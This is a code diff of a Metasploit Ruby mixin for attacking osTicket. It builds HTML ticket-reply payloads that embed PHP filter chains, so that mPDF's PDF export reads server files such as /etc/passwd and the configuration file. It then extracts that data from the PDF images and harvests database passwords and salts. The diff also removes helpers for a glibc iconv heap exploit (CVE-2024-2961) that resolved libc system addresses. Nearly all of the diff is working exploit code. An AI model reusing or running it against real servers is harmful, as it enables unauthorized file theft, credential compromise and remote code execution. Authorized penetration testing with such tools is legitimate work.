+++ lib/msf/core/auxiliary/osticket.rb
@@ -3,101 +3,14 @@
 require 'zlib'
 
 ##
-# Shared helpers for osTicket exploitation modules (CVE-2026-22200 + CNEXT CVE-2024-2961).
-#
-# All methods take explicit parameters and hold no module state. Module
-# implementations are responsible for option registration, datastore
-# access, and orchestration.
-#
-# Modules including this mixin MUST also include Msf::Exploit::Remote::HttpClient.
+# Shared helpers for osTicket auxiliary modules 
 ##
+
 module Msf
   module Auxiliary::Osticket
 
-    #
-    # Iconv character-set mapping table for PHP filter chain generation.
-    # Each hex nibble of a base64 character maps to a chain of iconv
-    # conversions that, when combined with base64-encode/decode cycles,
-    # produce that character in the output stream.
-    #
-    # Reference: https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
-    #
-    ICONV_MAPPINGS = {
-      '30' => 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE',
-      '31' => 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
-      '32' => 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
-      '33' => 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
-      '34' => 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
-      '35' => 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE',
-      '36' => 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
-      '37' => 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
-      '38' => 'convert.iconv.JS.UTF16|convert.iconv.L6.UTF-16',
-      '39' => 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
-      '2f' => 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
-      '41' => 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
-      '42' => 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
-      '43' => 'convert.iconv.CN.ISO2022KR',
-      '44' => 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
-      '45' => 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
-      '46' => 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
-      '47' => 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
-      '48' => 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
-      '49' => 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
-      '4a' => 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
-      '4b' => 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
-      '4c' => 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
-      '4d' => 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
-      '4e' => 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
-      '4f' => 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
-      '50' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
-      '51' => 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
-      '52' => 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
-      '53' => 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
-      '54' => 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
-      '55' => 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
-      '56' => 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
-      '57' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
-      '58' => 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
-      '59' => 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
-      '5a' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
-      '61' => 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
-      '62' => 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
-      '63' => 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
-      '64' => 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
-      '65' => 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
-      '66' => 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
-      '67' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
-      '68' => 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
-      '69' => 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
-      '6a' => 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
-      '6b' => 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
-      '6c' => 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
-      '6d' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
-      '6e' => 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
-      '6f' => 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
-      '70' => 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
-      '71' => 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
-      '72' => 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
-      '73' => 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
-      '74' => 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
-      '75' => 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
-      '76' => 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932',
-      '77' => 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
-      '78' => 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
-      '79' => 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
-      '7a' => 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937'
-    }.freeze
-
-    # CNEXT (CVE-2024-2961) constants
-    CNEXT_HEAP_SIZE = 2 * 1024 * 1024
-    CNEXT_BUG = "\xe5\x8a\x84".b # UTF-8 encoding of 劄 - triggers glibc iconv overflow
-    CNEXT_OFFSET_FREE_SLOT  = 0x20  # zend_mm_heap->free_slot offset (x86_64)
-    CNEXT_OFFSET_CUSTOM_HEAP = 0x168 # zend_mm_heap->custom_heap offset (x86_64)
-    CNEXT_CHUNK_SIZE = 0x100 # Default chunk size used in CNEXT heap manipulation
-
-    # ─────────────────────────────────────────────────────────
-    # Detection
-    # ─────────────────────────────────────────────────────────
+    include Msf::Exploit::Remote::HttpClient
+    include Msf::Exploit::Remote::HTTP::PhpFilterChain
 
     # Checks whether an HTTP response belongs to an osTicket installation.
     #
@@ -118,10 +31,6 @@ module Msf
       vprint_status("is_osticket?: osTicket signature #{found ? 'FOUND' : 'NOT found'} in response body")
       found
     end
-
-    # ─────────────────────────────────────────────────────────
-    # CSRF Token Extraction
-    # ─────────────────────────────────────────────────────────
 
     # Extracts the __CSRFToken__ hidden field value from an osTicket HTML page.
     # Handles name-before-value, value-before-name, and single/double quotes.
@@ -145,10 +54,6 @@ module Msf
       vprint_error('extract_csrf_token: No CSRF token found in HTML')
       nil
     end
-
-    # ─────────────────────────────────────────────────────────
-    # Authentication
-    # ─────────────────────────────────────────────────────────
 
     # Authenticates to the osTicket staff control panel (/scp/).
     #
@@ -196,27 +101,11 @@ module Msf
       vprint_status("osticket_login_scp: POST response code=#{res.code}, url=#{res.headers['Location']}, body contains userid=#{res.body.downcase.include?('userid')}")
 
       if res.code == 302
-        post_cookies = res.get_cookies
         # 302 responses may not set new cookies; fall back to the GET cookies
         # which already contain the authenticated OSTSESSID
-        session_cookies = post_cookies.empty? ? cookies_for_post : post_cookies
-
-        # Follow the redirect to complete the login flow (Python requests.Session
-        # does this automatically with allow_redirects=True)
-        location = res.headers['Location']
-        if location
-          redirect_uri = location.start_with?('http') ? URI.parse(location).path : location
-          vprint_status("osticket_login_scp: Following 302 redirect to #{redirect_uri}")
-          redir_res = send_request_cgi('method' => 'GET', 'uri' => redirect_uri, 'cookie' => session_cookies)
-          if redir_res
-            vprint_status("osticket_login_scp: Redirect response code=#{redir_res.code}, body=#{redir_res.body.to_s.length} bytes")
-            # If the redirect target sets additional cookies, use them
-            redir_cookies = redir_res.get_cookies
-            session_cookies = redir_cookies unless redir_cookies.empty?
-          end
-        end
-
-        vprint_good("osticket_login_scp: Login SUCCESS, cookies=#{session_cookies}")
+        session_cookies = res.get_cookies
+        session_cookies = cookies_for_post if session_cookies.empty?
+        vprint_good("osticket_login_scp: Login SUCCESS")
         return session_cookies
       end
 
@@ -278,27 +167,11 @@ module Msf
       vprint_status("osticket_login_client: POST response code=#{res.code}, body contains luser=#{res.body.include?('luser')}")
 
       if res.code == 302
-        post_cookies = res.get_cookies
         # 302 responses may not set new cookies; fall back to the GET cookies
         # which already contain the authenticated OSTSESSID
-        session_cookies = post_cookies.empty? ? cookies_for_post : post_cookies
-
-        # Follow the redirect to complete the login flow (Python requests.Session
-        # does this automatically with allow_redirects=True)
-        location = res.headers['Location']
-        if location
-          redirect_uri = location.start_with?('http') ? URI.parse(location).path : location
-          vprint_status("osticket_login_client: Following 302 redirect to #{redirect_uri}")
-          redir_res = send_request_cgi('method' => 'GET', 'uri' => redirect_uri, 'cookie' => session_cookies)
-          if redir_res
-            vprint_status("osticket_login_client: Redirect response code=#{redir_res.code}, body=#{redir_res.body.to_s.length} bytes")
-            # If the redirect target sets additional cookies, use them
-            redir_cookies = redir_res.get_cookies
-            session_cookies = redir_cookies unless redir_cookies.empty?
-          end
-        end
-
-        vprint_good("osticket_login_client: Login SUCCESS, cookies=#{session_cookies}")
+        session_cookies = res.get_cookies
+        session_cookies = cookies_for_post if session_cookies.empty?
+        vprint_good("osticket_login_client: Login SUCCESS")
         return session_cookies
       end
 
@@ -310,10 +183,6 @@ module Msf
       vprint_error('osticket_login_client: Login FAILED (still see login form)')
       nil
     end
-
-    # ─────────────────────────────────────────────────────────
-    # Ticket Operations
-    # ─────────────────────────────────────────────────────────
 
     # Resolves a user-visible ticket number to the internal numeric ticket ID
     # used in tickets.php?id= parameters.
@@ -338,7 +207,7 @@ module Msf
         return nil
       end
       vprint_status("find_ticket_id: Ticket listing response code=#{res.code}, body=#{res.body.to_s.length} bytes")
-      vprint_status("find_ticket_id: Body:\n#{res.body}")
+      vprint_status("find_ticket_id: Body Length:\n#{res.body.length}")
       return nil unless res.code == 200
 
       match = res.body.match(/tickets\.php\?id=(\d+)[^>]*>.*?#?#{Regexp.escape(ticket_number.to_s)}/m)
@@ -367,6 +236,41 @@ module Msf
       nil
     end
 
+    # Acquires a ticket lock via the SCP AJAX endpoint, which is required
+    # before submitting a reply on the staff panel.
+    #
+    # @param base_uri  [String] base path to osTicket
+    # @param ticket_id [String] internal ticket ID
+    # @param cookies   [String] session cookies
+    # @return [String] lock code, or empty string if unavailable
+    def acquire_lock_code(base_uri, ticket_id, cookies)
+      lock_uri = normalize_uri(base_uri, 'scp', 'ajax.php', 'lock', 'ticket', ticket_id.to_s)
+      vprint_status("acquire_lock_code: POST #{lock_uri}")
+      res = send_request_cgi(
+        'method'  => 'POST',
+        'uri'     => lock_uri,
+        'cookie'  => cookies,
+        'headers' => { 'X-Requested-With' => 'XMLHttpRequest' }
+      )
+      return '' unless res&.code == 200
+
+      begin
+        data = JSON.parse(res.body)
+        if data['code']
+          vprint_good('acquire_lock_code: Got lock code from JSON response')
+          return data['code'].to_s
+        end
+      rescue JSON::ParserError
+      end
+
+      # Sometimes returned as plain text
+      text = res.body.to_s.strip
+      return text if text.length < 30
+
+      vprint_warning('acquire_lock_code: Could not parse lock code, reply may fail')
+      ''
+    end
+
     # Submits an HTML payload as a ticket reply. The payload is injected into
     # the reply body and will be rendered by mPDF when the ticket PDF is exported.
     #
@@ -378,12 +282,15 @@ module Msf
     # @return [Boolean] true if the reply was accepted
     def submit_ticket_reply(base_uri, prefix, ticket_id, html_content, cookies)
       ticket_uri = normalize_uri(base_uri, prefix, 'tickets.php')
-      vprint_status("submit_ticket_reply: GET #{ticket_uri}?id=#{ticket_id} to fetch CSRF token")
 
+      # SCP requires acquiring a lock before loading the reply page
+      lock_code = prefix == '/scp' ? acquire_lock_code(base_uri, ticket_id, cookies) : ''
+
+      vprint_status("submit_ticket_reply: GET #{ticket_uri}?id=#{ticket_id} to fetch CSRF token")
       res = send_request_cgi(
-        'method' => 'GET',
-        'uri' => ticket_uri,
-        'cookie' => cookies,
+        'method'   => 'GET',
+        'uri'      => ticket_uri,
+        'cookie'   => cookies,
         'vars_get' => { 'id' => ticket_id }
       )
       unless res
@@ -399,21 +306,52 @@ module Msf
         return false
       end
 
-      # SCP uses 'response' textarea, client portal uses 'message'
       textarea_name = detect_reply_textarea(res.body, prefix)
       vprint_status("submit_ticket_reply: Using textarea field '#{textarea_name}', payload=#{html_content.length} bytes")
 
+      post_vars = if prefix == '/scp'
+        # Parse from_email_id from the page (default "1" if not found)
+        from_email_id = '1'
+        email_match = res.body.match(/name="from_email_id"[^>]*value="([^"]*)"/) ||
+                      res.body.match(/value="([^"]*)"[^>]*name="from_email_id"/)
+        from_email_id = email_match[1] if email_match
+
+        # Fall back to parsing lockCode from page HTML if AJAX didn't return one
+        if lock_code.empty?
+          lc_match = res.body.match(/name="lockCode"[^>]*value="([^"]+)"/) ||
+                     res.body.match(/value="([^"]+)"[^>]*name="lockCode"/)
+          lock_code = lc_match[1] if lc_match
+        end
+
+        {
+          '__CSRFToken__'   => csrf,
+          'id'              => ticket_id,
+          'msgId'           => '',
+          'a'               => 'reply',
+          'lockCode'        => lock_code.to_s,
+          'from_email_id'   => from_email_id,
+          'reply-to'        => 'all',
+          'cannedResp'      => '0',
+          'draft_id'        => '',
+          textarea_name     => html_content,
+          'signature'       => 'none',
+          'reply_status_id' => '1'
+        }
+      else
+        {
+          '__CSRFToken__' => csrf,
+          'id'            => ticket_id,
+          'a'             => 'reply',
+          textarea_name   => html_content
+        }
+      end
+
       vprint_status("submit_ticket_reply: POST #{ticket_uri} with a=reply, id=#{ticket_id}")
       res = send_request_cgi(
-        'method' => 'POST',
-        'uri' => ticket_uri,
-        'cookie' => cookies,
-        'vars_post' => {
-          '__CSRFToken__' => csrf,
-          'id' => ticket_id,
-          'a' => 'reply',
-          textarea_name => html_content
-        }
+        'method'    => 'POST',
+        'uri'       => ticket_uri,
+        'cookie'    => cookies,
+        'vars_post' => post_vars
       )
       unless res
         vprint_error('submit_ticket_reply: No response from POST reply (nil)')
@@ -452,33 +390,14 @@ module Msf
       ].each do |params|
         query = params.map { |k, v| "#{k}=#{v}" }.join('&')
         vprint_status("download_ticket_pdf: GET #{base}?#{query}")
-        res = send_request_cgi(
-          'method' => 'GET',
-          'uri' => base,
-          'cookie' => cookies,
-          'vars_get' => params
+        res = send_request_cgi!(
+          { 'method' => 'GET', 'uri' => base, 'cookie' => cookies, 'vars_get' => params },
+          20,
+          max_redirects
         )
         unless res
           vprint_error("download_ticket_pdf: No response (nil) for params=#{params}")
           next
-        end
-
-        # Follow 302 redirects (osTicket may redirect to the actual PDF URL)
-        redirect_limit = max_redirects
-        while res.code == 302 && redirect_limit > 0
-          location = res.headers['Location']
-          break unless location
-
-          redirect_uri = location.start_with?('http') ? URI.parse(location).path : location
-          vprint_status("download_ticket_pdf: Following 302 redirect to #{redirect_uri}")
-          res = send_request_cgi(
-            'method' => 'GET',
-            'uri' => redirect_uri,
-            'cookie' => cookies
-          )
-          break unless res
-
-          redirect_limit -= 1
         end
 
         content_type = res.headers['Content-Type'] || ''
@@ -497,9 +416,6 @@ module Msf
       nil
     end
 
-    # ─────────────────────────────────────────────────────────
-    # PHP Filter Chain Generation
-    # ─────────────────────────────────────────────────────────
 
     # Builds a minimal 24-bit BMP file header used as a carrier for
     # exfiltrated data. mPDF renders it as an image whose pixel data
@@ -532,7 +448,7 @@ module Msf
 
       b64_payload.reverse.each_char do |c|
         hex_char = c.ord.to_s(16)
-        mapping = ICONV_MAPPINGS[hex_char]
+        mapping = CONVERSIONS[hex_char]
         next unless mapping
 
         filters << mapping << '|'
@@ -577,7 +493,7 @@ module Msf
     # property points to a PHP filter chain URI, triggering mPDF to process it.
     #
     # @param file_specs [Array<String>, Array<Hash>] file paths to read.
-    #   Strings may include encoding suffix: "/etc/passwd,b64zlib".
+    #   Strings may include encoding suffix: "/etc/passwd:b64zlib".
     #   Hashes should have :path and optionally :encoding keys.
     # @param is_reply [Boolean] true for ticket reply, false for ticket creation
     # @return [String] HTML payload
@@ -604,7 +520,7 @@ module Msf
       html
     end
 
-    # Wraps a raw PHP filter chain URI (e.g. a CNEXT payload) in the
+    # Wraps a raw PHP filter chain URI in the
     # osTicket HTML injection format for delivery via ticket reply.
     #
     # @param filter_uri [String] php://filter/... URI
@@ -614,10 +530,6 @@ module Msf
       sep = is_reply ? '&#38;&#35;&#51;&#52;' : '&#34'
       "<ul><li style=\"list-style-image:url#{sep}(#{quote_with_forced_uppercase(filter_uri)})\">listitem</li></ul>"
     end
-
-    # ─────────────────────────────────────────────────────────
-    # PDF / BMP Data Extraction Pipeline
-    # ─────────────────────────────────────────────────────────
 
     # Extracts exfiltrated file contents from a PDF generated by mPDF.
     #
@@ -645,7 +557,9 @@ module Msf
         bgr_data = swap_rgb_bgr(img_data)
         vprint_status("extract_files_from_pdf: Image ##{idx}: #{img_data.length} bytes, swapped to BGR")
 
+        # Try BGR-swapped data first; fall back to raw if swap didn't help
         content = extract_data_from_bmp_stream(bgr_data)
+        content ||= extract_data_from_bmp_stream(img_data)
         next unless content && !content.empty?
 
         clean = content.sub(/\x00+\z/, ''.b)
@@ -657,12 +571,8 @@ module Msf
         end
       end
 
-      unless results.empty?
-        vprint_status("extract_files_from_pdf: Total extracted files: #{results.length}")
-        return results
-      end
-
-      # Fallback: scan all streams directly (for edge cases where BGR swap isn't needed)
+      # Fallback: scan all streams directly (catches data not in XObjects or where
+      # BGR swap wasn't needed). Always runs so partial primary results aren't final.
       streams = extract_pdf_streams(pdf_data)
       vprint_status("extract_files_from_pdf: Fallback - scanning #{streams.length} raw streams")
 
@@ -673,10 +583,13 @@ module Msf
         clean = content.sub(/\x00+\z/, ''.b)
         pad_idx = clean.index('@C>=='.b)
         clean = clean[0...pad_idx] if pad_idx && pad_idx > 0
-        unless clean.empty?
-          vprint_good("extract_files_from_pdf: Stream ##{idx} yielded #{clean.length} bytes of extracted data")
-          results << clean
-        end
+        next if clean.empty?
+
+        # Skip duplicates already found by the primary XObject path
+        next if results.any? { |r| r == clean }
+
+        vprint_good("extract_files_from_pdf: Stream ##{idx} yielded #{clean.length} bytes of extracted data")
+        results << clean
       end
 
       vprint_status("extract_files_from_pdf: Total extracted files: #{results.length}")
@@ -931,379 +844,73 @@ module Msf
           .gsub(/[^\x20-\x7E\n\r\t]/, '').b
     end
 
-    # ─────────────────────────────────────────────────────────
-    # CNEXT: Memory Layout Analysis
-    # ─────────────────────────────────────────────────────────
-
-    # Parses /proc/self/maps content into structured memory region entries.
+    # Searches extracted file contents for osTicket configuration secrets and reports them.
+    # Prints a KEY FINDINGS block and stores credentials/notes to the database.
+    # Works regardless of which portal (SCP or client) was used to authenticate.
     #
-    # @param maps_content [String] raw contents of /proc/self/maps
-    # @return [Array<Hash>] array of { start:, stop:, perms:, path:, size: }
-    def cnext_parse_proc_maps(maps_content)
-      pattern = /^([0-9a-f]+)-([0-9a-f]+)\s+([-rwxps]{4})\s+\S+\s+\S+\s+\S+\s*(.*)/
-      regions = []
-
-      maps_content.each_line do |line|
-        match = line.strip.match(pattern)
-        next unless match
-
-        start_addr = match[1].to_i(16)
-        stop_addr  = match[2].to_i(16)
-        path = match[4].strip
-        path = '' unless path.include?('/') || path.include?('[')
-
-        regions << {
-          start: start_addr,
-          stop: stop_addr,
-          perms: match[3],
-          path: path,
-          size: stop_addr - start_addr
-        }
-      end
-
-      regions
-    end
-
-    # Finds the first memory region whose path contains any of the given names.
-    #
-    # @param regions [Array<Hash>] parsed memory regions
-    # @param names   [Array<String>] substrings to match against region paths
-    # @return [Hash, nil] matching region or nil
-    def cnext_find_region(regions, *names)
-      regions.find { |r| names.any? { |n| r[:path].include?(n) } }
-    end
-
-    # Locates PHP's main zend_mm_heap in the process memory map.
-    # Searches for anonymous RW regions >= 2MB aligned on 2MB boundary.
-    #
-    # @param regions [Array<Hash>] parsed memory regions
-    # @return [Integer, nil] heap address (base of zend_mm_heap)
-    def cnext_find_main_heap(regions)
-      candidates = regions.select do |r|
-        r[:perms] == 'rw-p' &&
-          r[:size] >= CNEXT_HEAP_SIZE &&
-          (r[:stop] & (CNEXT_HEAP_SIZE - 1)).zero? &&
-          (r[:path].empty? || r[:path] == '[anon:zend_alloc]')
-      end
-      return nil if candidates.empty?
-
-      # Heap is at the bottom of the region
-      candidates.last[:stop] - CNEXT_HEAP_SIZE + 0x40
-    end
-
-    # ─────────────────────────────────────────────────────────
-    # CNEXT: ELF Parsing & Libc Symbol Resolution
-    # ─────────────────────────────────────────────────────────
-
-    # Extracts the GNU Build ID from ELF binary data.
-    #
-    # @param elf_data [String] raw ELF binary data (may be partial)
-    # @return [String, nil] hex-encoded build ID, or nil
-    def cnext_extract_build_id(elf_data)
-      gnu_name = "GNU\x00".b
-      pos = 0
-
-      while (name_offset = elf_data.index(gnu_name, pos))
-        header_offset = name_offset - 12
-        if header_offset < 0
-          pos = name_offset + 1
-          next
-        end
-
-        n_namesz, n_descsz, n_type = elf_data[header_offset, 12].unpack('VVV') rescue nil
-        unless n_namesz
-          pos = name_offset + 1
-          next
-        end
-
-        if n_namesz == 4 && n_type == 3 # NT_GNU_BUILD_ID
-          build_id_data = elf_data[name_offset + n_namesz, n_descsz]
-          return build_id_data.unpack1('H*') if build_id_data
-        end
-
-        pos = name_offset + 1
-      end
-
-      nil
-    end
-
-    # Parses an ELF64 little-endian binary's .dynsym section to resolve symbols.
-    #
-    # @param elf_data     [String] full ELF binary data
-    # @param symbol_names [Array<String>] symbol names to look up
-    # @return [Hash{String => Integer}] symbol name to offset within ELF
-    def cnext_parse_elf_symbols(elf_data, *symbol_names)
-      return {} if elf_data.nil? || elf_data.length < 64
-      return {} unless elf_data[0, 4] == "\x7fELF"
-      return {} unless elf_data[4].ord == 2 && elf_data[5].ord == 1 # ELF64 LE
-
-      e_shoff     = elf_data[40, 8].unpack1('Q<')
-      e_shentsize = elf_data[58, 2].unpack1('v')
-      e_shnum     = elf_data[60, 2].unpack1('v')
-      e_shstrndx  = elf_data[62, 2].unpack1('v')
-
-      return {} if e_shoff.zero? || e_shnum.zero?
-      return {} if e_shoff + e_shnum * e_shentsize > elf_data.length
-
-      # Section header string table
-      shstrtab_hdr = elf_data[e_shoff + e_shstrndx * e_shentsize, e_shentsize]
-      shstrtab_off = shstrtab_hdr[24, 8].unpack1('Q<')
-      shstrtab_sz  = shstrtab_hdr[32, 8].unpack1('Q<')
-      shstrtab = elf_data[shstrtab_off, shstrtab_sz]
-
-      dynsym_hdr = dynstr_hdr = nil
-      e_shnum.times do |i|
-        sh = elf_data[e_shoff + i * e_shentsize, e_shentsize]
-        sh_name_idx = sh[0, 4].unpack1('V')
-        sh_type     = sh[4, 4].unpack1('V')
-        name = shstrtab[sh_name_idx..].to_s.split("\x00", 2).first
-
-        dynsym_hdr = sh if name == '.dynsym' && sh_type == 11
-        dynstr_hdr = sh if name == '.dynstr' && sh_type == 3
-      end
-      return {} unless dynsym_hdr && dynstr_hdr
-
-      dynsym_off = dynsym_hdr[24, 8].unpack1('Q<')
-      dynsym_sz  = dynsym_hdr[32, 8].unpack1('Q<')
-      dynsym_ent = dynsym_hdr[56, 8].unpack1('Q<')
-      dynsym_ent = 24 if dynsym_ent.zero?
-
-      dynstr_off = dynstr_hdr[24, 8].unpack1('Q<')
-      dynstr_sz  = dynstr_hdr[32, 8].unpack1('Q<')
-      dynstr = elf_data[dynstr_off, dynstr_sz]
-
-      results = {}
-      (dynsym_sz / dynsym_ent).times do |i|
-        sym = elf_data[dynsym_off + i * dynsym_ent, dynsym_ent]
-        st_name  = sym[0, 4].unpack1('V')
-        st_value = sym[8, 8].unpack1('Q<')
-        name = dynstr[st_name..].to_s.split("\x00", 2).first
-
-        results[name] = st_value if symbol_names.include?(name) && st_value != 0
-      end
-
-      results
-    end
-
-    # Resolves __libc_malloc, __libc_system, and __libc_realloc from libc ELF data.
-    #
-    # @param libc_data [String] full libc ELF binary
-    # @param libc_base [Integer] runtime base address of libc
-    # @return [Hash, nil] { malloc:, system:, realloc: } absolute addresses
-    def cnext_resolve_libc_offsets(libc_data, libc_base)
-      symbols = cnext_parse_elf_symbols(
-        libc_data,
-        '__libc_malloc', '__libc_system', '__libc_realloc'
-      )
-
-      missing = %w[__libc_malloc __libc_system __libc_realloc] - symbols.keys
-      return nil unless missing.empty?
-
-      {
-        malloc:  libc_base + symbols['__libc_malloc'],
-        system:  libc_base + symbols['__libc_system'],
-        realloc: libc_base + symbols['__libc_realloc']
+    # @param extracted [Array<String>] raw file contents extracted from the PDF
+    def report_secrets(extracted)
+      secret_patterns = {
+        'SECRET_SALT' => /define\('SECRET_SALT','([^']+)'\)/,
+        'ADMIN_EMAIL' => /define\('ADMIN_EMAIL','([^']+)'\)/,
+        'DBHOST'      => /define\('DBHOST','([^']+)'\)/,
+        'DBNAME'      => /define\('DBNAME','([^']+)'\)/,
+        'DBUSER'      => /define\('DBUSER','([^']+)'\)/,
+        'DBPASS'      => /define\('DBPASS','([^']+)'\)/
       }
-    end
 
-    # ─────────────────────────────────────────────────────────
-    # CNEXT: Encoding Helpers
-    # ─────────────────────────────────────────────────────────
+      found_any = false
 
-    # Wraps data in HTTP chunked transfer-encoding format. If size is given,
-    # the chunk header is zero-padded to make the total exactly `size` bytes.
-    #
-    # @param data [String] chunk body
-    # @param size [Integer, nil] target total size
-    # @return [String] chunked representation
-    def cnext_chunked_chunk(data, size = nil)
-      size = data.length + 8 if size.nil?
-      keep = data.length + 2 # two \n delimiters
-      hex_len = data.length.to_s(16).rjust(size - keep, '0')
-      "#{hex_len}\n".b + data + "\n".b
-    end
+      extracted.each do |content|
+        text = content.encode('UTF-8', 'binary', invalid: :replace, undef: :replace, replace: '') rescue next
 
-    # Creates a 0x8000-byte bucket for use with the dechunk filter.
-    #
-    # @param data [String] payload data
-    # @return [String] compressed bucket
-    def cnext_compressed_bucket(data)
-      cnext_chunked_chunk(data, 0x8000)
-    end
+        secret_patterns.each do |key, pattern|
+          match = text.match(pattern)
+          next unless match
 
-    # Emulates PHP's quoted-printable-encode: every byte becomes =XX.
-    #
-    # @param data [String] binary data
